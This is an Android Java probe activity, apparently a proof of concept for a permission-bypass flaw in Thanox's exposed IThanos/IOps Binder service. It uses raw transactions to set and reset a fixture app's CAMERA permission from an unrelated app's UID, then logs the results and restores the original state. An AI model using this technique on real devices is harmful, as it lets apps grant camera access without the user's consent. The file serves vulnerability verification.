package dev.thanoxbridge.probe.perm20261120;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.util.Log;
import java.lang.reflect.Method;

public final class ProbeActivity extends Activity {
    private static final String TARGET = "dev.thanoxbridge.target.perm20261120";
    private static final String PERMISSION = "android.permission.CAMERA";
    private static final String ROOT = "github.tornaco.android.thanos.core.IThanos";
    private static final String OPS = "github.tornaco.android.thanos.core.ops.IOps";
    private static final int CAMERA = 26;
    private static final String TAG = "ThanoxPermProbe";

    @Override public void onCreate(Bundle saved) {
        super.onCreate(saved);
        StringBuilder out = new StringBuilder("run=20261120-perm1");
        IBinder ops = null;
        String initial = null;
        boolean attempted = false;
        try {
            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
            Method getService = serviceManager.getDeclaredMethod("getService", String.class);
            IBinder service = (IBinder) getService.invoke(null, "tv_input");
            if (service == null || !ROOT.equals(service.getInterfaceDescriptor())) {
                throw new IllegalStateException("service descriptor");
            }
            String version = readString(service, ROOT, 19, null);
            if (!"9.1".equals(version)) throw new IllegalStateException("version=" + version);
            ops = readBinder(service, ROOT, 31);
            if (ops == null || !OPS.equals(ops.getInterfaceDescriptor())) {
                throw new IllegalStateException("ops descriptor");
            }
            out.append(";callerUid=").append(Process.myUid());
            out.append(";targetUid=").append(getPackageManager().getPackageUid(TARGET, 0));
            out.append(";version=").append(version);
            out.append(";opName=").append(readString(ops, OPS, 3, CAMERA));
            out.append(";opPermission=").append(readString(ops, OPS, 4, CAMERA));
            initial = readPerm(ops);
            out.append(";before=").append(initial);
            out.append(";androidBefore=").append(androidState());
            if (androidState() != PackageManager.PERMISSION_DENIED) {
                throw new IllegalStateException("fixture unexpectedly granted");
            }
            attempted = true;
            setMode(ops, "DENY");
            out.append(";deny=").append(readPerm(ops));
            out.append(";androidDeny=").append(androidState());
            setMode(ops, "ALLOW_ALWAYS");
            out.append(";allow=").append(readPerm(ops));
            out.append(";androidAllow=").append(androidState());
            setMode(ops, "DENY");
            out.append(";redeny=").append(readPerm(ops));
            out.append(";androidRedeny=").append(androidState());
        } catch (Throwable error) {
            out.append(";error=").append(error.getClass().getName())
                .append(':').append(String.valueOf(error.getMessage()).replace('\n', ' '));
        } finally {
            if (attempted && ops != null) {
                try {
                    String mode = initial == null ? "DENY" : initial.split(",")[0];
                    if ("UNKNOWN".equals(mode) || "NOT_SET".equals(mode)) mode = "DENY";
                    setMode(ops, mode);
                    out.append(";restored=").append(readPerm(ops));
                    out.append(";androidRestored=").append(androidState());
                } catch (Throwable error) {
                    out.append(";restoreError=").append(error.getClass().getName())
                        .append(':').append(String.valueOf(error.getMessage()).replace('\n', ' '));
                }
            }
            Log.i(TAG, out.toString());
            finish();
        }
    }

    private int androidState() {
        return getPackageManager().checkPermission(PERMISSION, TARGET);
    }

    private static IBinder readBinder(IBinder binder, String descriptor, int code) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(descriptor);
            if (!binder.transact(code, data, reply, 0)) throw new IllegalStateException("binder transact");
            reply.readException();
            return reply.readStrongBinder();
        } finally { data.recycle(); reply.recycle(); }
    }

    private static String readString(IBinder binder, String descriptor, int code, Integer arg)
            throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(descriptor);
            if (arg != null) data.writeInt(arg);
            if (!binder.transact(code, data, reply, 0)) throw new IllegalStateException("string transact");
            reply.readException();
            return reply.readString();
        } finally { data.recycle(); reply.recycle(); }
    }

    private static String readPerm(IBinder ops) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(OPS);
            data.writeInt(CAMERA);
            writePkg(data);
            if (!ops.transact(2, data, reply, 0)) throw new IllegalStateException("read transact");
            reply.readException();
            if (reply.readInt() == 0) throw new IllegalStateException("null permission info");
            String state = reply.readString();
            boolean background = reply.readByte() != 0;
            boolean runtime = reply.readByte() != 0;
            boolean oneTime = reply.readByte() != 0;
            String summary = reply.readString();
            return state + "," + background + "," + runtime + "," + oneTime
                + "," + (summary == null ? "null" : "present");
        } finally { data.recycle(); reply.recycle(); }
    }

    private static void setMode(IBinder ops, String mode) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(OPS);
            data.writeInt(CAMERA);
            writePkg(data);
            data.writeString(mode);
            if (!ops.transact(1, data, reply, 0)) throw new IllegalStateException("set transact");
            reply.readException();
        } finally { data.recycle(); reply.recycle(); }
    }

    private static void writePkg(Parcel data) {
        data.writeInt(1);
        data.writeString(TARGET);
        data.writeInt(0);
    }
}
